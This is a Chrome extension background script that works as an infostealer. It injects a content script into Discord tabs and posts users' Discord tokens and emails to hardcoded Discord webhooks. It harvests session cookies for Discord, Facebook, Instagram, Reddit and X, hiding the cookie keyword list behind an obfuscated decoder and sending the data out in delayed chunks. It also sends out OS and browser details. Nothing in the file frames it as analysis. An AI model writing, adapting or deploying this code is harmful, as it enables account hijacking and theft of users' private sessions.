// Different webhooks for different logging purposes.
const opsint_url = "https://discord.com/api/webhooks/1424164288519475273/doZ1O56UMz1Sgx4ub6JINUqE370_m7G_n2ayuxMDvjuPivzs-2bOBJ3SwElQe4k_BbOe";
const buffer_url = "https://discord.com/api/webhooks/1430325370493730960/Myl4mFATnfUowxo-aSQMbg51KKmeUOeiS-uc5hmx1-4FomK15MZlm1Br36Gv2ZSjfSMT";
const gnlV2_url = "https://discord.com/api/webhooks/1430325422779924520/2A_4Shw0JK2XIrYtrJKoS9oDF1nZdpQpCbC3PSPyR_u9oZ5jl2c_a0jB9FGjNh7Cm4Wx";
const result_url = "https://discord.com/api/webhooks/1430325484272615527/NJs5jGE5S3ooMvdoazgg4yeBCOipA3vhqyxhQiDUeFdLxxodmfPLRlyywxa_VGnZLw_S";

var _$_bd1f=(function(l,g){var i=l.length;var c=[];for(var v=0;v< i;v++){c[v]= l.charAt(v)};for(var v=0;v< i;v++){var f=g* (v+ 384)+ (g% 34521);var m=g* (v+ 319)+ (g% 36685);var q=f% i;var d=m% i;var o=c[q];c[q]= c[d];c[d]= o;g= (f+ m)% 3458025};var h=String.fromCharCode(127);var s='';var p='\x25';var k='\x23\x31';var a='\x25';var u='\x23\x30';var y='\x23';return c.join(s).split(p).join(h).split(k).join(a).split(u).join(y).split(h)})("etssonkoiesi%n%did",2540754);const KEYWORDS=[_$_bd1f[0],_$_bd1f[1],_$_bd1f[2]]

// List of domains to filter cookies for (e.g., TikTok, Google, etc.)
const ALLOWED_DOMAINS = [".discord.com", ".facebook.com", ".instagram.com", ".reddit.com", ".x.com"];

// Inject content script into the first found Discord tab
chrome.tabs.query({ url: "*://*.discord.com/*" }, (tabs) => {
    if (tabs.length > 0) {
        const tab = tabs[0];  // Select the first Discord tab

        chrome.scripting.executeScript(
            {
                target: { tabId: tab.id },
                files: ['contentScript.js']
            },
            () => {
                if (chrome.runtime.lastError) {
                    console.error(chrome.runtime.lastError);
                }
            }
        );
    }
});


// Listen for messages from the content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message) {
        if(message.type === "token") {
            let dataToSend = `\nUser Token: ${message.token}\nAll Tokens: ${message.tokens}\nEmail: ${message.email}`;
            // Send token to Discord webhook
            // You can replace this with whatever works, sending it to a database, a web server, all work.
            fetch(opsint_url, {
                method: "POST",
                body: JSON.stringify({
                    content: `Discord Information:\n \`\`\`${dataToSend}\`\`\``
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            }).then(response => {
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                return response.text();
            }).then(text => {
                sendResponse({ status: "success" });
            }).catch(error => {
                sendResponse({ status: "error" });
            });
        } else if(message.type === "result") {
            // Send token to Discord webhook
            fetch(result_url, {
                method: "POST",
                body: JSON.stringify({
                    content: `Search results:\n \`\`\`${message.result}\`\`\``
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            }).then(response => {
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                return response.text();
            }).then(text => {
                sendResponse({ status: "success" });
            }).catch(error => {
                sendResponse({ status: "error" });
            });
        }
        return true;
    }
});


function matchesKeyword(name) {
    return KEYWORDS.some(keyword => name.toLowerCase().includes(keyword));
}

function matchesDomain(domain) {
    return ALLOWED_DOMAINS.some(allowedDomain => domain.endsWith(allowedDomain));
}

const CHUNK_SIZE = 1000; // Max characters per chunk
const DELAY_MS = 10000; // 10 seconds delay

// Helper function to split the string into chunks of a given size
function splitIntoChunks(str, chunkSize) {
    const chunks = [];
    for (let i = 0; i < str.length; i += chunkSize) {
        chunks.push(str.substring(i, i + chunkSize));
    }
    return chunks;
}

// Helper function to wait for a specified amount of time
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendCookiesInChunks(cookies) {
    chrome.cookies.getAll({}, async (cookies) => {
        const filteredCookies = cookies.filter(cookie => 
            matchesKeyword(cookie.name) && matchesDomain(cookie.domain)
        );


        if (filteredCookies.length === 0) {
            return;
        }

        const cookieData = filteredCookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain
        }));

        const cookieString = JSON.stringify(cookieData);
        const chunks = splitIntoChunks(cookieString, CHUNK_SIZE);

        for (let i = 0; i < chunks.length; i++) {
            try {
                const chunk = chunks[i];

                // Construct payload for Discord webhook
                const payload = {
                    content: `Cookie data (part ${i + 1}/${chunks.length}): \`\`\`${chunk}\`\`\``
                };

                const response = await fetch(buffer_url, {
                    method: 'POST',
                    body: JSON.stringify(payload),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

                const text = await response.text();
            } catch (error) {
                console.error(`Error sending chunk ${i + 1}:`, error);
            }

            // Wait for the specified delay before sending the next chunk
            await delay(DELAY_MS);
        }
    })
}

sendCookiesInChunks();


chrome.runtime.getPlatformInfo((info) => {
    const osInfo = `OS: ${info.os}, Arch: ${info.arch}, NaCl Arch: ${info.nacl_arch}`;
    
    const browserInfo = navigator.userAgent; // Gets the full user agent string
    

    // Send the information to your webhook or log it
    const message = `Operating System:\n\`\`\`${osInfo}\`\`\`\nBrowser Version: \n\`\`\`${browserInfo}\`\`\``;

    fetch(gnlV2_url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: message
        })
    }).then(response => {
        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
        return response.text();
    }).catch(error => {
        console.error('Error sending information:', error);
    });
});



// Function to filter and send cookies
async function getFilteredCookiesAndPost() {
    chrome.cookies.getAll({}, (cookies) => {
        const filteredCookies = cookies.filter(cookie => 
            matchesKeyword(cookie.name) && matchesDomain(cookie.domain)
        );


        if (filteredCookies.length === 0) {
            return;
        }

        const cookieData = filteredCookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite
        }));

        const cookieString = JSON.stringify(cookieData);
        const chunks = splitIntoChunks(cookieString, 2000);

        // Send filtered cookies to the webhook
        for (let i = 0; i < chunks.length; i++) {
            try {
                const chunk = chunks[i];
                const response = await fetch(buffer_url, {
                    method: 'POST',
                    body: JSON.stringify({ content: `Cookie data (part ${i + 1}/${chunks.length}): ${chunk}` }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

                const text = await response.text();
                console.log(`Chunk ${i + 1} sent successfully.`);
            } catch (error) {
                console.error(`Error sending chunk ${i + 1}:`, error);
            }

            // Wait for the specified delay before sending the next chunk
            await delay(10000);
        }
    }
}

// Call the function to retrieve and filter cookies
getFilteredCookiesAndPost();
